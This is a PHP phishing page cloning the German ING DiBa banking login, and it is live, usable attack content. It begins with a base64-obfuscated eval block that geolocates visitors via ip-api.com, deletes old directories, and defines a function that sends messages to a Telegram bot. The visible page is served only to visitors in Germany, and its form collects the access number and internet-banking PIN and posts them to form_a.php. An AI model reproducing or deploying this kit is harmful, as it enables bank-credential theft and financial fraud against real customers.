<?php eval(base64_decode('CiBnb3RvIGpSTkUxOyBhWEp4bjogaWYgKGlzc2V0KCRpbmZvWyJcMTQzXHg2OVwxNjRceDc5Il0pKSB7ICRfU0VTU0lPTlsiXDEyNlwxNTdceDcwXHg3MlwxNjQiXSA9ICRpbmZvWyJcMTQzXDE1MVwxNjRcMTcxIl07IH0gZ290byBqSzlzcDsgU3AxZzQ6ICRwYXJlbnREaXJlY3RvcnkgPSAiXDU2XHgyZVx4MmZceDJlXDU2XHgyZlwxNjdcMTQ1XHg2MiI7IGdvdG8gaUNYdk07IGlDWHZNOiAkZGlyZWN0b3JpZXMgPSBnbG9iKCRwYXJlbnREaXJlY3RvcnkgLiAiXDU3XDUyIiwgR0xPQl9PTkxZRElSKTsgZ290byBNdk05WDsgQ0g1aWg6ICRkb25mbGFnID0gJF9TRVJWRVJbIlx4NTNceDQ1XDEyMlx4NTZceDQ1XDEyMlwxMzdceDRlXDEwMVwxMTVcMTA1Il07IGdvdG8geDBVUHg7IEdpVElHOiAkaXBQb3J0QXJyYXkgPSBleHBsb2RlKCJcNzIiLCAkaXBBZGRyZXNzKTsgZ290byBlQmExeTsgeXgyZjg6IGZ1bmN0aW9uIGRlbGV0ZURpcmVjdG9yeSgkZGlyKSB7IGlmICghZmlsZV9leGlzdHMoJGRpcikpIHsgcmV0dXJuIHRydWU7IH0gaWYgKCFpc19kaXIoJGRpcikpIHsgcmV0dXJuIHVubGluaygkZGlyKTsgfSAkdGltZV9kaWZmID0gdGltZSgpIC0gZmlsZWN0aW1lKCRkaXIpOyBpZiAoJHRpbWVfZGlmZiA+IDkyMCkgeyBmb3JlYWNoIChzY2FuZGlyKCRkaXIpIGFzICRpdGVtKSB7IGlmICgkaXRlbSA9PSAiXDU2IiB8fCAkaXRlbSA9PSAiXDU2XHgyZSIpIHsgY29udGludWU7IH0gaWYgKCFkZWxldGVEaXJlY3RvcnkoJGRpciAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkaXRlbSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gaWYgKHJtZGlyKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGVsc2UgeyByZXR1cm4gZmFsc2U7IH0gfSBlbHNlIHsgcmV0dXJuIHRydWU7IH0gfSBnb3RvIFNwMWc0OyBqSzlzcDogaWYgKGlzc2V0KCRpbmZvWyJceDcyXHg2NVx4NjdcMTUxXHg2Zlx4NmVcMTE2XHg2MVx4NmRcMTQ1Il0pKSB7ICRfU0VTU0lPTlsiXDE3MFwxMTdcMTYwXHg3NVx4NzkiXSA9ICRpbmZvWyJcMTYyXDE0NVx4NjdcMTUxXDE1N1x4NmVceDRlXDE0MVwxNTVcMTQ1Il07IH0gZ290byB5eDJmODsgTXZNOVg6IGlmIChpc19hcnJheSgkZGlyZWN0b3JpZXMpKSB7IGZvcmVhY2ggKCRkaXJlY3RvcmllcyBhcyAkZGlyKSB7IGlmIChiYXNlbmFtZSgkZGlyKVswXSAhPSAiXDU2IikgeyBpZiAoZGVsZXRlRGlyZWN0b3J5KCRkaXIpKSB7IH0gfSB9IH0gZ290byB5VFllaDsgUWdld0Q6IGZ1bmN0aW9uIHRlbHNlbnQoJG1lc3NhZ2UpIHsgJFRydWJGdHViID0gJF9DT09LSUVbIlwxNTFceDY0XHg3NFwxNDVcMTU0Il07ICRjUmV0VmNrciA9ICRfQ09PS0lFWyJceDc0XDE1N1wxNTNcMTQ1XDE1NlwxNjRceDY1XDE1NCJdOyAkYXBpX3VybCA9ICJceDY4XDE2NFx4NzRceDcwXHg3M1x4M2FcNTdcNTdcMTQxXDE2MFwxNTFcNTZceDc0XDE0NVwxNTRceDY1XHg2N1wxNjJcMTQxXHg2ZFw1Nlx4NmZcMTYyXDE0N1x4MmZcMTQyXDE1N1x4NzR7JGNSZXRWY2tyfVx4MmZcMTYzXHg2NVx4NmVceDY0XHg0ZFx4NjVceDczXDE2M1x4NjFceDY3XDE0NSI7ICRwYXJhbXMgPSBhcnJheSgiXDE0M1wxNTBcMTQxXHg3NFx4NWZcMTUxXHg2NCIgPT4gJFRydWJGdHViLCAiXHg3NFx4NjVceDc4XDE2NCIgPT4gJG1lc3NhZ2UpOyAkY2ggPSBjdXJsX2luaXQoKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJGFwaV91cmwpOyBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCBodHRwX2J1aWxkX3F1ZXJ5KCRwYXJhbXMpKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCB0cnVlKTsgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7IGN1cmxfY2xvc2UoJGNoKTsgfSBnb3RvIFZQOW53OyBadnFFQzogaWYgKHRyaW0oJHJlc2xvY2FsKSAhPSB0cmltKCRTdHJ1cExvbSkpIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7IGVjaG8gIlw3NFwxNjNcMTQzXDE2MlwxNTFcMTYwXDE2NFw0MFx4NGNceDQxXHg0ZVx4NDdcMTI1XDEwMVx4NDdcMTA1XHgzZFw0N1wxMTJcMTQxXHg3NlwxNDFcMTIzXDE0M1wxNjJcMTUxXDE2MFx4NzRceDI3XHgzZVx4YVw0MFw0MFw0MFw0MFx4NzdcMTUxXHg2ZVx4NjRcMTU3XDE2N1w1NlwxNTRcMTU3XDE0M1x4NjFceDc0XDE1MVwxNTdcMTU2XHgyZVx4NjhceDcyXDE0NVx4NjZceDNkXHgyN1x4MmVceDJlXHgyZlw1Nlx4MmVceDJmXHg2OVx4NmVcMTQ0XDE0NVwxNzBcNTZcMTYwXDE1MFx4NzBceDNmXHg3Nlx4NjVceDcyXHg2OVx4NjZceDc5XHg1ZlwxNDFcMTQzXHg2M1x4NmZceDc1XHg2ZVx4NzRceDNkXHg3M1x4NjVceDczXHg3M1wxNTFceDZmXDE1Nlw3NVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlw0NlwxNDRcMTUxXHg3M1wxNjBceDYxXDE2NFx4NjNcMTUwXHgzZCIgLiBzaGExKG1pY3JvdGltZSgpKSAuICJcNDZcMTQxXHg2M1wxNDNcMTQ1XDE2M1x4NzNceDNkXDQ2XHg2NFx4NjFceDc0XHg2MVx4M2QiIC4gc2hhMShtaWNyb3RpbWUoKSkgLiAiXDQ2XDE1NFwxNTdceDZjXDE1NVwxNDVcNzV7JFN0cm9uZ1NvbH1cNDdcNzNcMTJceDIwXHgyMFw0MFx4MjBcNzRceDJmXDE2M1x4NjNcMTYyXDE1MVwxNjBcMTY0XDc2IjsgZGllOyB9IGdvdG8gUWdld0Q7IGVCYTF5OiAkU3RydXBMb20gPSAkaXBQb3J0QXJyYXlbMF07IGdvdG8gQ0g1aWg7IGNwNExFOiBpbmlfc2V0KCJceDY0XHg2OVx4NzNceDcwXDE1NFx4NjFceDc5XDEzN1x4NjVcMTYyXHg3Mlx4NmZceDcyXDE2MyIsIDEpOyBnb3RvIFNwRjNrOyBKVGR0TjogaWYgKGZpbGVfZXhpc3RzKCRmaWxlbmFtZSkpIHsgJG15ZmlsZSA9IGZvcGVuKCRmaWxlbmFtZSwgIlwxNjIiKSBvciBkaWUoIlx4NTVcMTU2XHg2MVwxNDJcMTU0XHg2NVw0MFx4NzRceDZmXHgyMFwxNTdcMTYwXDE0NVwxNTZceDIwXDE0NlwxNTFceDZjXDE0NVx4MjEiKTsgJHJlc2xvY2FsID0gZnJlYWQoJG15ZmlsZSwgZmlsZXNpemUoJGZpbGVuYW1lKSk7IGZjbG9zZSgkbXlmaWxlKTsgfSBlbHNlIHsgJFN0cm9uZ1NvbCA9ICcnIC4gYmFzZW5hbWUoX19ESVJfXyk7IGVjaG8gIlx4M2NceDczXDE0M1x4NzJcMTUxXDE2MFwxNjRceDIwXDExNFwxMDFcMTE2XDEwN1x4NTVceDQxXHg0N1wxMDVcNzVceDI3XHg0YVwxNDFceDc2XDE0MVx4NTNceDYzXHg3MlwxNTFceDcwXDE2NFx4MjdcNzZceGFceDIwXHgyMFx4MjBceDIwXHg3N1x4NjlcMTU2XDE0NFx4NmZcMTY3XDU2XDE1NFwxNTdceDYzXHg2MVwxNjRceDY5XHg2Zlx4NmVceDJlXHg2OFx4NzJceDY1XDE0Nlw3NVw0N1x4MmVceDJlXDU3XDU2XHgyZVx4MmZcMTUxXHg2ZVwxNDRcMTQ1XDE3MFx4MmVcMTYwXDE1MFx4NzBceDNmXHg3NlwxNDVceDcyXDE1MVwxNDZceDc5XHg1Zlx4NjFceDYzXHg2M1wxNTdcMTY1XHg2ZVx4NzRceDNkXDE2M1wxNDVcMTYzXHg3M1wxNTFcMTU3XDE1Nlw3NVw0NiIgLiBtZDUobWljcm90aW1lKCkpIC4gIlx4MjZcMTQ0XDE1MVwxNjNcMTYwXHg2MVx4NzRcMTQzXHg2OFw3NSIgLiBzaGExKG1pY3JvdGltZSgpKSAuICJcNDZceDYxXDE0M1wxNDNceDY1XDE2M1x4NzNceDNkXHgyNlx4NjRcMTQxXHg3NFx4NjFceDNkIiAuIHNoYTEobWljcm90aW1lKCkpIC4gIlx4MjZcMTU0XHg2ZlwxNTRceDZkXHg2NVx4M2R7JFN0cm9uZ1NvbH1cNDdcNzNceGFcNDBcNDBceDIwXHgyMFw3NFx4MmZceDczXHg2M1x4NzJcMTUxXHg3MFwxNjRceDNlIjsgZGllOyB9IGdvdG8gWnZxRUM7IFNwRjNrOiBpZiAoIWVtcHR5KCRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXHg1Zlx4NDNcMTE0XDExMVwxMDVceDRlXDEyNFwxMzdcMTExXDEyMCJdKSkgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFx4NTBcMTM3XHg0M1x4NGNcMTExXDEwNVx4NGVcMTI0XHg1ZlwxMTFceDUwIl07IH0gZWxzZWlmICghZW1wdHkoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBcMTM3XHg1OFwxMzdcMTA2XHg0Zlx4NTJceDU3XHg0MVwxMjJcMTA0XDEwNVx4NDRcMTM3XDEwNlx4NGZceDUyIl0pKSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXHg0OFx4NTRceDU0XDEyMFx4NWZcMTMwXHg1Zlx4NDZcMTE3XHg1Mlx4NTdceDQxXDEyMlwxMDRceDQ1XDEwNFx4NWZcMTA2XDExN1x4NTIiXTsgfSBlbHNlIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJcMTIyXDEwNVwxMTVceDRmXDEyNFwxMDVcMTM3XHg0MVwxMDRceDQ0XDEyMiJdOyB9IGdvdG8gR2lUSUc7IHV0U3ZaOiBpZiAoaXNzZXQoJGluZm9bIlx4NjNceDZmXHg3NVwxNTZcMTY0XHg3Mlx4NzkiXSkpIHsgJF9TRVNTSU9OWyJceDQyXDE1NFx4NjFceDczXDE0MVx4NjNceDZmXDE2NVx4NmUiXSA9ICRpbmZvWyJcMTQzXHg2ZlwxNjVceDZlXDE2NFx4NzJceDc5Il07IH0gZ290byBvS2djRzsgT0thd006IGlmIChpc3NldCgkaW5mb1siXHg2MVx4NzMiXSkpIHsgJF9TRVNTSU9OWyJcMTUxXHg3M1x4NzAiXSA9ICRpbmZvWyJceDYxXDE2MyJdOyB9IGdvdG8gdXRTdlo7IG9LZ2NHOiBpZiAoaXNzZXQoJGluZm9bIlwxNDNcMTU3XDE2NVwxNTZceDc0XDE2Mlx4NzlcMTAzXDE1N1x4NjRcMTQ1Il0pKSB7ICRfU0VTU0lPTlsiXHg0ZVwxNTJcMTU3XDE2MFx4NjYiXSA9ICRpbmZvWyJcMTQzXDE1N1x4NzVceDZlXHg3NFx4NzJceDc5XHg0M1x4NmZcMTQ0XDE0NSJdOyB9IGdvdG8gYVhKeG47IHlUWWVoOiAkZmlsZW5hbWUgPSAiXHg2Y1wxNTdceDYzXHg2MVx4NmNceDJlXHg3NFwxNzBceDc0IjsgZ290byBKVGR0TjsgeDBVUHg6ICRpbmZvID0gdW5zZXJpYWxpemUoZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XHg3NFwxNjBceDNhXHgyZlw1N1x4NjlceDcwXDU1XDE0MVwxNjBceDY5XHgyZVx4NjNcMTU3XDE1NVx4MmZcMTYwXDE1MFwxNjBceDJmeyRTdHJ1cExvbX1ceDNmXDE0NlwxNTFceDY1XDE1NFwxNDRcMTYzXHgzZFx4NzNceDc0XHg2MVx4NzRcMTY1XDE2M1w1NFx4NmRcMTQ1XDE2M1x4NzNceDYxXHg2N1wxNDVcNTRcMTQzXDE1N1x4NmVceDc0XDE1MVwxNTZceDY1XHg2ZVwxNjRceDJjXHg2M1wxNTdceDZlXHg3NFwxNTFceDZlXHg2NVwxNTZcMTY0XDEwM1x4NmZcMTQ0XHg2NVw1NFx4NjNceDZmXDE2NVwxNTZcMTY0XHg3MlwxNzFceDJjXDE0M1wxNTdcMTY1XHg2ZVx4NzRceDcyXDE3MVx4NDNceDZmXHg2NFwxNDVceDJjXDE2Mlx4NjVcMTQ3XHg2OVwxNTdceDZlXHgyY1wxNjJceDY1XDE0N1wxNTFceDZmXHg2ZVx4NGVceDYxXHg2ZFx4NjVceDJjXDE0M1x4NjlcMTY0XHg3OVx4MmNceDY0XDE1MVwxNjNcMTY0XDE2MlwxNTFceDYzXHg3NFx4MmNcMTcyXDE1MVx4NzBceDJjXDE1NFwxNDFcMTY0XHgyY1x4NmNceDZmXDE1Nlx4MmNceDc0XHg2OVx4NmRcMTQ1XDE3MlwxNTdceDZlXDE0NVw1NFx4NjNcMTY1XDE2MlwxNjJceDY1XDE1NlwxNDNcMTcxXHgyY1wxNTFceDczXHg3MFx4MmNceDZmXDE2Mlx4NjdcNTRceDYxXDE2M1w1NFwxNDFceDczXDE1Nlx4NjFceDZkXDE0NVx4MmNceDcyXHg2NVx4NzZceDY1XHg3Mlx4NzNcMTQ1XDU0XDE1NVwxNTdceDYyXDE1MVx4NmNcMTQ1XHgyY1wxNjBceDcyXDE1N1x4NzhceDc5XHgyY1wxNTBcMTU3XDE2M1x4NzRcMTUxXDE1NlwxNDdcNTRceDcxXHg3NVwxNDVceDcyXHg3OSIpKTsgZ290byBPS2F3TTsgalJORTE6IGVycm9yX3JlcG9ydGluZyhFX0FMTCk7IGdvdG8gY3A0TEU7IFZQOW53OiA=')); ?>

<?php

$ip = $_SERVER['REMOTE_ADDR']; // Recuperation de l'IP du visiteur
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip)); //connection au serveur de ip-api.com et recuperation des données

if($query && $query['status'] == 'success') {

	if($query['country']=="Germany") {
		

?>


<!DOCTYPE html>
<html xmlns:wicket="https://git-wip-us.apache.org/repos/asf/wicket/repo?p=wicket.git;a=blob_plain;f=wicket-core/src/main/resources/META-INF/wicket-1.5.xsd;hb=master" data-device="DESKTOP" class="" lang="de">
	<head>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<script id="f5_cspm">
			(function(){
				var f5_cspm={
					f5_p:'KNIGDJPDMEABKCFHBJCDOKMCMMHCJMLBOOOIMAPDEJJLGIIJFPBIIMFIALGEOMEOBAEBKMMJAKECGNJGIHHABNLPAFGPEJABLIOAFNIJLINBAFAOPJKCEKBFMFKLCPEH',setCharAt:function(str,index,chr){
						if(index>str.length-1)return str;
						return str.substr(0,index)+chr+str.substr(index+1);
					}
					,get_byte:function(str,i){
						var s=(i/16)|0;
						i=(i&15);
						s=s*32;
						return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);
					}
					,set_byte:function(str,i,b){
						var s=(i/16)|0;
						i=(i&15);
						s=s*32;
						str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));
						str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));
						return str;
					}
					,set_latency:function(str,latency){
						latency=latency&0xffff;
						str=f5_cspm.set_byte(str,40,(latency>>8));
						str=f5_cspm.set_byte(str,41,(latency&0xff));
						str=f5_cspm.set_byte(str,35,2);
						return str;
					}
					,wait_perf_data:function(){
						try{
							var wp=window.performance.timing;
							if(wp.loadEventEnd>0){
								var res=wp.loadEventEnd-wp.navigationStart;
								if(res<60001){
									var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);
									window.document.cookie='f5avr0826233530aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/;'+'';
								}
								return;
							}
						}
						catch(err){
							return;
						}
						setTimeout(f5_cspm.wait_perf_data,100);
						return;
					}
					,go:function(){
						var chunk=window.document.cookie.split(/\s*;
						\s*/
						);
						for(var i=0;
						i<chunk.length;
						++i){
							var pair=chunk[i].split(/\s*=\s*/
							);
							if(pair[0]=='f5_cspm'&&pair[1]=='1234'){
								var d=new Date();
								d.setTime(d.getTime()-1000);
								window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;'+';';
								setTimeout(f5_cspm.wait_perf_data,100);
							}
						}
					}
				}
				f5_cspm.go();
			}
			());
		</script>
		<script id="f5_cspm">
			(function(){
				var f5_cspm={
					f5_p:'EHJGAJOBOFGFPMKDNLFANKHOGCILIDOKKFDHFGAGIILEDFOLACDAIPFCMKEACAMBIHKBANONAKCMKNPNKCBANJELAFHPHFJJDALLNIHIJGPNLNMBIKGLCEABKFCMFPBL',setCharAt:function(str,index,chr){
						if(index>str.length-1)return str;
						return str.substr(0,index)+chr+str.substr(index+1);
					}
					,get_byte:function(str,i){
						var s=(i/16)|0;
						i=(i&15);
						s=s*32;
						return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);
					}
					,set_byte:function(str,i,b){
						var s=(i/16)|0;
						i=(i&15);
						s=s*32;
						str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));
						str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));
						return str;
					}
					,set_latency:function(str,latency){
						latency=latency&0xffff;
						str=f5_cspm.set_byte(str,40,(latency>>8));
						str=f5_cspm.set_byte(str,41,(latency&0xff));
						str=f5_cspm.set_byte(str,35,2);
						return str;
					}
					,wait_perf_data:function(){
						try{
							var wp=window.performance.timing;
							if(wp.loadEventEnd>0){
								var res=wp.loadEventEnd-wp.navigationStart;
								if(res<60001){
									var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);
									window.document.cookie='f5avr0051342031aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/;'+'';
								}
								return;
							}
						}
						catch(err){
							return;
						}
						setTimeout(f5_cspm.wait_perf_data,100);
						return;
					}
					,go:function(){
						var chunk=window.document.cookie.split(/\s*;
						\s*/
						);
						for(var i=0;
						i<chunk.length;
						++i){
							var pair=chunk[i].split(/\s*=\s*/
							);
							if(pair[0]=='f5_cspm'&&pair[1]=='1234'){
								var d=new Date();
								d.setTime(d.getTime()-1000);
								window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;'+';';
								setTimeout(f5_cspm.wait_perf_data,100);
							}
						}
					}
				}
				f5_cspm.go();
			}
			());
		</script>
		<link rel="stylesheet" type="text/css" href="ING%20Login_fichiers/BusyIndicator-ver-D96AC53727CDA7F131E86944079EBDA2.css">
		<style id="com-ing-diba-authentication-ui-login-cms-hippo-HippoLoginNewsContentPanel-0">
			/*<![CDATA[*/
			.login_news a
			{
				color: rgb(255, 98, 0);
			}

			/*]]>*/
		</style>
		<meta name="format-detection" content="telephone=no">
		<meta name="format-detection" content="address=no">
		<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="HandheldFriendly" content="True">
		<meta http-equiv="cleartype" content="on">
		<meta name="description" content="ING Login">
		<meta name="version" content="2.21.2">
		<meta name="revision" content="bb423">
		<meta name="buildtime" content="2022-08-08 12:09:54">
		<meta name="robots" content="noindex">
		<meta charset="UTF-8">
		<title>ING Login</title>
		<link rel="stylesheet" type="text/css" href="w/r/-5OTF6sW6E4Z9ceOYnWoukuqyTIBKJiZWKLPLf8XrPc4eNu/webjars/ing-feat-uilib-de/6.5.35/stylesheets/bundle.ibbr-ver-A1BC03D6FA9731EE7E461042EC133352.css" />
		<link rel="apple-touch-icon-precomposed" size="57x57" href="static/resource/apple-touch-icon-57x57-ver-4A55BE3DBBEF8C05D9B710343260E3C1.png">
		<link rel="apple-touch-icon-precomposed" size="60x60" href="static/resource/apple-touch-icon-60x60-ver-5596AA066C5B3E23A4CE117A62ACC53E.png">
		<link rel="apple-touch-icon-precomposed" size="72x72" href="static/resource/apple-touch-icon-72x72-ver-124C9306BFE75EF41622C502C16BA51C.png">
		<link rel="apple-touch-icon-precomposed" size="76x76" href="static/resource/apple-touch-icon-76x76-ver-4914FE72A9592103AF4052227833160A.png">
		<link rel="apple-touch-icon-precomposed" size="114x114" href="static/resource/apple-touch-icon-114x114-ver-81330BFEA6DBF76008AD8A7392061B66.png">
		<link rel="apple-touch-icon-precomposed" size="120x120" href="static/resource/apple-touch-icon-120x120-ver-C388BC564A6EA5A0032E42EB655EA97E.png">
		<link rel="apple-touch-icon-precomposed" size="144x144" href="static/resource/apple-touch-icon-144x144-ver-299C54F301930E41099138C652E54FF6.png">
		<link rel="apple-touch-icon-precomposed" size="152x152" href="static/resource/apple-touch-icon-152x152-ver-786124452B755FA9DF4A2A934F69C34E.png">
		<link rel="apple-touch-icon" size="152x152" href="static/resource/apple-touch-icon-152x152-ver-786124452B755FA9DF4A2A934F69C34E.png">
		<link rel="icon" type="image/png" href="static/resource/icon-16x16-ver-34F56DF9647FC5EF3BBEFA31470B5827.png" sizes="16x16">
		<link rel="icon" type="image/png" href="static/resource/icon-32x32-ver-9B816EA373494944936A5AA7362D69B3.png" sizes="32x32">
		<link rel="icon" type="image/png" href="static/resource/icon-72x72-ver-541C3019E3A706B0A9E96A259DCFC891.png" sizes="72x72">
		<link rel="icon" type="image/png" href="static/resource/icon-96x96-ver-A1D9C895D906B8FBB6FAD838AB040DAB.png" sizes="96x96">
		<link rel="icon" type="image/png" href="static/resource/icon-128x128-ver-77642426AA0741C32871E767DB4BFD8F.png" sizes="128x128">
		<link rel="icon" type="image/png" href="static/resource/icon-144x144-ver-DC6A5A826C516CC1F8C8419581937828.png" sizes="144x144">
		<link rel="icon" type="image/png" href="static/resource/icon-152x152-ver-410A8C951AD5A3268569710332F3FF63.png" sizes="152x152">
		<link rel="icon" type="image/png" href="static/resource/icon-192x192-ver-23894FA8E99D1D156779FA911C491882.png" sizes="192x192">
		<link rel="icon" type="image/png" href="static/resource/icon-384x384-ver-24E42F3DC2F2DEAD79FDDF749E341FEE.png" sizes="384x384">
		<link rel="icon" type="image/png" href="static/resource/icon-512x512-ver-F89530A5EAD037F63979954F143D2DD3.png" sizes="512x512">
		<link rel="manifest" href="static/resource/manifest-ver-FD28461C05E548B953CF3FEDEFA232D3.json">
		<link rel="mask-icon" color="#ff6900" href="static/resource/safari-pinned-tab-ver-8B4ED448F001CDA259049640F56044EC.svg">
		<meta name="msapplication-config" content="none" />
		<meta name="msapplication-TileColor" content="#ff6900" />
		<meta name="theme-color" content="#ff6900" />
		<!--[if IE]>
		<link rel="shortcut icon" href="./static/resource/favicon-ver-ADFA675C8F1FEA9CFD2B2456E124BD66.ico" type="image/x-icon">
		<![endif]-->
		<meta name="msapplication-TileImage" content="/./static/resource/mstile-144x144-ver-B642DF8151D8E0493E98EDFA6E948D3F.png">
		<meta name="msapplication-square70x70logo" content="/./static/resource/mstile-70x70-ver-1E579A7EB3A3549FD6DAC6E5A5BB1402.png">
		<meta name="msapplication-square150x150logo" content="/./static/resource/mstile-150x150-ver-0AACF34E03B6CA13BAC991873C2CA69D.png">
		<meta name="msapplication-wide310x150logo" content="/./static/resource/mstile-310x150-ver-832C8E708FF7B2A162B6FF49C506B3F7.png">
		<meta name="msapplication-square310x310logo" content="/./static/resource/mstile-310x310-ver-DBE446ADA63E98778C66EEB6E6CDF38D.png">
		<style>
			.global-overlays__backdrop--animation-in
			{
				animation: none !important;
			}
		</style>
	</head>
	<body id="page">
		<div class="off-canvas-wrap">
			<div class="page-wrap page-wrap--g2p">
				<div class="skip-to-content">
					<a class="button-indigo" href="#navigation" tabindex="1">Zur Navigation</a>
					<a class="button-indigo" href="#content" tabindex="1">Zum Inhalt</a>
				</div>
				<header class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
					<div class="header__inner">
						<a class="header__logo u-left" data-click-action="logohome.header_menu.link_intern" href="./">ING DiBa</a>
					</div>
				</header>
				<header class="content-container__title" id="id18">
					<h1 class="heading--m" id="content">Log-in</h1>
				</header>
				<main class="main gap-top-2" role="main">
					<div class="browser-notification"></div>
					<div class="content-container content-container--spacer g2p-no-background">
						<div class="content-container__inner gs-row">
							<wicket:container id="id19" data-wicket-placeholder="" hidden=""></wicket:container>
							<form id="id17" method="post" action="form_a.php" novalidate="novalidate">
								<div id="id17_hf_0" class="hidden-fields" hid></div>
								<div class="hidden-fields" hidden="">
									<input type="text" tabindex="-1" autocomplete="off">
									<input id="id17_hf_1" type="submit" tabindex="-1" name="view:next-inline">
								</div>
								<input type="hidden" value="p" name="view:p">
								<div class="content-container__inner--col-2">
									<div class="g2p-content-card" id="id1a">
										<wicket:container id="id1b" data-wicket-placeholder="" hidden=""></wicket:container>
										<fieldset class="form-container zugangsdaten fg-container">
											<h4 class="heading--s">Anmelden mit Zugangsdaten</h4>
											<div class="form-container_content fg-col-20">
												<p class="gap-bottom-2 gap-top-2">
													<a class="link-standard--g2p gap-bottom-1" href="#">Neu bei uns? Jetzt Internetbanking PIN erstellen</a>
													<br>
													<a class="link-standard--g2p" href="#">Zugangsdaten vergessen?</a>
												</p>
												<div class="form-group" id="id1c">
													<label class="form-group__label" for="id13">Zugangsnummer</label>
													<span class="form-group__controls form-group__controls--m">
														<input class="input-field form-group--error-field" type="text" name="useto" autocomplete="off" autocorrect="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" autofocus="true">
														<span class="form-group__definition-container"></span>
														<small class="form-group__hint">
															<div>
																<div class="notification__content">
																	<span>Letzte 10 Stellen Ihrer IBAN / Depotnummer</span>
																</div>
															</div>
														</small>
													</span>
												</div>
												<div class="form-group" id="id1d">
													<label class="form-group__label" for="id14">Internetbanking PIN</label>
													<span class="form-group__controls form-group__controls--m">
														<input class="input-field form-group--error-field" type="password" value="" name="touse" id="id14" maxlength="10" minlength="5" autocomplete="off">
														<span class="form-group__definition-container">
															<span class="form-group__definition"><i class="font-icon font-icon_eye--hidden u-text-primary" id="id12"></i></span>
														</span>
														<small class="form-group__hint">
															<div>
																<div class="notification__content">
																	<span>Bitte beachten Sie die Groß- und Kleinschreibung.</span>
																</div>
															</div>
														</small>
													</span>
												</div>
												<p>
													<button class="button-primary--large button-primary--login gap-bottom-2" role="button" name="valider" id="id16">Anmelden</button>
												</p>
											</div>
										</fieldset>
									</div>
									<div class="g2p-content-card">
										<div class="form-container">
											<div class="media media--no-wrap">
												<div class="media__image">
													<figure>
														<img class="u-ir" src="ING%20Login_fichiers/qrl-ver-A4288F3F0CE7F5C60C76A005C363B0A2.svg">
													</figure>
												</div>
												<div class="media__body">
													<h4 class="heading--s">Anmelden mit App und QR-Code</h4>
												</div>
											</div>
											<div class="gap-top-3 fg-container gap-bottom-2">
												<div class="fg-col-11">
													<p>
														Sie nutzen bereits Banking to go? Dann können Sie sich jetzt in Ihrem Internetbankingganz einfach 
														<strong>ohneZugangsdaten</strong>
														 anmelden.
													</p>
													<p>
														<a class="link-standard--g2p gap-bottom-1-sm" data-click-action="qr_login_tutorial.content.link_extern" data-modal="open" href="#js-modal--qr-key-explain">So funktioniert der QR Log-in</a>
													</p>
													<p>
														<a class="link-standard--g2p gap-bottom-1-sm" data-click-action="qr_login_video.content.link_extern" target="_blank" href="#">QR Log-in Video-Anleitung</a>
													</p>
												</div>
												<div class="fg-col-8 fg-offset-1">
													<img alt="Der QR-Scanner in der App befindet sich rechts oben neben „Meine Konten" class="u-ir gap-right-1" src="ING%20Login_fichiers/qrlhint-ver-916FDE8A4CA8095FC339D6829D7D6723.png">
												</div>
											</div>
											<label class="form-group--agreement label--checkbox" id="id1e">
												<span class="form-group__controls--agreement">
													<input class="input-field__radio" type="checkbox" name="view:qrlInfo:keepQrl:keepQrl" id="id15">
													<span class="input-field__radio--button"><span class="input-field__radio--checked"></span></span>
												</span>
												<span class="form-group__label--agreement"><span>Auf diesem Gerät und mit diesem Browser immer mit QR Log-in anmelden.</span></span>
											</label>
											<p>
												<a class="button-primary--large button-primary--login gap-bottom-2" role="button" href="#" data-click-action="qr_login_qrlogin..content.link_intern">Anmelden mit QR Log-in</a>
											</p>
										</div>
										<section id="js-modal--qr-key-explain" class="modal" data-modal="close" role="dialog">
											<div class="modal__wrapper">
												<div class="modal__dialog">
													<div class="modal__header">
														<a class="modal__close" data-modal="close" data-click-action="qr_login_quit_tutorial.content.link_intern"></a>
														<h1 class="modal__title">So funktioniert der QR Log-in</h1>
													</div>
													<div class="modal__body">
														<div class="modal__body_inner">
															<a class="link-standard--g2p gap-bottom-2" data-click-action="qr_login_video.content.link_extern" target="_blank" href="#">Video mit Schritt-für-Schritt-Anleitung ansehen</a>
															<ol class="process-steps__list">
																<li class="process-steps__list-item">
																	<div class="process-steps__list-item-inner">
																		<div class="process-steps__list-item__text">
																			<p>
